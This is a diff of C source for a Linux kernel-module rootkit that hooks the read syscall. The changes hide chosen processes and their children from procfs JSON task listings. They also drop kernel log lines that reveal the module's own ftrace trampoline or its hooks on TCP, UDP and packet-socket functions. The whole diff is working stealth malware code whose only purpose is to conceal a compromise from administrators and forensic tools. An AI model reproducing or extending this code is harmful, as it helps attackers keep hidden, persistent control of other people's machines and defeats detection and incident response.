@@ -75,20 +75,7 @@ static notrace bool is_cgroup_pid_file(struct file *file)
 
 static notrace bool is_pid_hidden(pid_t pid)
 {
-    int i;
-    
-    if (pid <= 0)
-        return false;
-    
-    if (hidden_count < 0 || hidden_count > MAX_HIDDEN_PIDS)
-        return false;
-    
-    for (i = 0; i < hidden_count; i++) {
-        if (hidden_pids[i] == pid)
-            return true;
-    }
-    
-    return false;
+    return is_hidden_pid((int)pid) || is_child_pid((int)pid);
 }
 
 static notrace ssize_t filter_hidden_pids_from_buffer(char *buf, ssize_t len)
@@ -425,6 +412,110 @@ static notrace ssize_t filter_proc_children_pids(char __user *user_buf, ssize_t 
     return out_len;
 }
 
+static notrace bool is_procfs_file(struct file *file)
+{
+    struct super_block *sb;
+
+    if (!file || !file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+    sb = file->f_path.mnt->mnt_sb;
+    return sb->s_type && sb->s_type->name &&
+           strcmp(sb->s_type->name, "proc") == 0;
+}
+
+static notrace ssize_t filter_proc_json_tasks(char __user *user_buf, ssize_t bytes_read)
+{
+    char *buf;
+    ssize_t new_len;
+    int i;
+    int snap[MAX_HIDDEN_PIDS];
+    int snap_count;
+
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+
+    snap_count = hidden_pids_snapshot(snap, MAX_HIDDEN_PIDS);
+    if (snap_count <= 0)
+        return bytes_read;
+
+    if (bytes_read > MAX_CAP)
+        bytes_read = MAX_CAP;
+
+    buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
+    if (!buf)
+        return bytes_read;
+
+    if (copy_from_user(buf, user_buf, bytes_read)) {
+        kvfree(buf);
+        return bytes_read;
+    }
+    buf[bytes_read] = '\0';
+    new_len = bytes_read;
+
+    for (i = 0; i < snap_count; i++) {
+        char needle[32];
+        int  needle_len;
+        char *p, *end;
+
+        needle_len = snprintf(needle, sizeof(needle), "{\"pid\":%d,", snap[i]);
+        if (needle_len <= 0 || needle_len >= (int)sizeof(needle))
+            continue;
+
+        p   = buf;
+        end = buf + new_len;
+
+        while (p < end) {
+            char   *match = NULL;
+            char   *obj_end;
+            size_t  j, remaining;
+
+            remaining = (size_t)(end - p);
+            for (j = 0; j + (size_t)needle_len <= remaining; j++) {
+                if (memcmp(p + j, needle, needle_len) == 0) {
+                    match = p + j;
+                    break;
+                }
+            }
+            if (!match)
+                break;
+
+            obj_end = match + needle_len;
+            while (obj_end < end && *obj_end != '}')
+                obj_end++;
+            if (obj_end >= end)
+                break;
+            obj_end++;
+
+            {
+                char   *rm_start = match;
+                char   *rm_end   = obj_end;
+                size_t  tail;
+
+                if (rm_start > buf && *(rm_start - 1) == ',')
+                    rm_start--;
+                else if (rm_end < end && *rm_end == ',')
+                    rm_end++;
+
+                tail     = (size_t)(end - rm_end);
+                memmove(rm_start, rm_end, tail);
+                new_len -= (ssize_t)(rm_end - rm_start);
+                end      = buf + new_len;
+                p        = rm_start;
+            }
+        }
+    }
+
+    if (new_len != bytes_read) {
+        if (copy_to_user(user_buf, buf, new_len)) {
+            kvfree(buf);
+            return bytes_read;
+        }
+    }
+
+    kvfree(buf);
+    return new_len;
+}
+
 static notrace bool is_nf_conntrack_file(struct file *file)
 {
     const char *name;
@@ -750,12 +841,39 @@ notrace static bool is_kmsg_device(const char *filename) {
     return filename && strcmp(filename, "kmsg") == 0;
 }
 
+static notrace bool line_has_our_trampoline(const char *line)
+{
+    const char *p;
+    unsigned long addr = 0;
+    char c;
+
+    p = strstr(line, "tramp: 0x");
+    if (!p)
+        return false;
+    p = strstr(p, " (0x");
+    if (!p)
+        return false;
+    p += 4;
+
+    while ((c = *p++)) {
+        if      (c >= '0' && c <= '9') addr = (addr << 4) | (unsigned long)(c - '0');
+        else if (c >= 'a' && c <= 'f') addr = (addr << 4) | (unsigned long)(c - 'a' + 10);
+        else if (c >= 'A' && c <= 'F') addr = (addr << 4) | (unsigned long)(c - 'A' + 10);
+        else break;
+    }
+
+    return addr && within_module(addr, THIS_MODULE);
+}
+
 notrace static bool line_contains_sensitive_info(const char *line)
 {
     const char *p;
 
     if (!line)
         return false;
+
+    if (line_has_our_trampoline(line))
+        return true;
 
     for (p = line; *p; p++) {
         switch (*p) {
@@ -783,6 +901,9 @@ notrace static bool line_contains_sensitive_info(const char *line)
 
         case 't':
             if (strncmp(p, "taint", 5) == 0) return true;
+            if (strncmp(p, "tcp4_seq_show", 13) == 0) return true;
+            if (strncmp(p, "tcp6_seq_show", 13) == 0) return true;
+            if (strncmp(p, "tpacket_rcv", 11) == 0) return true;
             break;
 
         case 's':
@@ -797,10 +918,10 @@ notrace static bool line_contains_sensitive_info(const char *line)
             break;
 
         case 'u':
-            if (strncmp(p, "unrecognized netlink message", 28) == 0)
-                return true;
-            if (strncmp(p, "unknown SID", 11) == 0)
-                return true;
+            if (strncmp(p, "udp4_seq_show", 13) == 0) return true;
+            if (strncmp(p, "udp6_seq_show", 13) == 0) return true;
+            if (strncmp(p, "unrecognized netlink message", 28) == 0) return true;
+            if (strncmp(p, "unknown SID", 11) == 0) return true;
             break;
 
         case 'm':
@@ -1012,6 +1133,14 @@ static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
         if (orig_res <= 0)
             return orig_res;
         return filter_proc_children_pids(user_buf, orig_res);
+    }
+
+    if (hidden_count > 0 && is_procfs_file(file)) {
+        orig_res = orig_read(regs);
+        fput(file);
+        if (orig_res > 0)
+            return filter_proc_json_tasks(user_buf, orig_res);
+        return orig_res;
     }
 
     if (is_nf_conntrack_file(file)) {
